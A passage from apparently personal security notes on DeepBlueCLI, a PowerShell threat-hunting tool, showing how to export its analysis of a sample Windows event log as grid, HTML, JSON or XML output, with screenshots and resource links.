|GridView|`.\DeepBlue.ps1 .\evtx\psattack-security.evtx \| Out-GridView`|
|HTML|`.\DeepBlue.ps1 .\evtx\psattack-security.evtx \| ConvertTo-Html`|
|JSON|`.\DeepBlue.ps1 .\evtx\psattack-security.evtx \| ConvertTo-Json`|
|XML|`.\DeepBlue.ps1 .\evtx\psattack-security.evtx \| ConvertTo-Xml`|

For example lets try generate a html report.

![[Pasted image 20211123120536.png]]

If we open the report on our browser, it would look as follows:

![[Pasted image 20211123120713.png]]

# Resources
- [DeepBlueCLI](https://github.com/sans-blue-team/DeepBlueCLI)
- [p0w3rsh3ll blog](https://p0w3rsh3ll.wordpress.com/2020/03/29/get-a-deepblue-analysis/)
- [socinvestigation](https://www.socinvestigation.com/deepbluecli-powershell-module-for-threat-hunting/)
- [SANS ISC InfoSec Forums](https://isc.sans.edu/forums/diary/DeepBlueCLI+Powershell+Threat+Hunting/25730/)
- [MICHELE'S BLOG](https://michelepariani.com/)
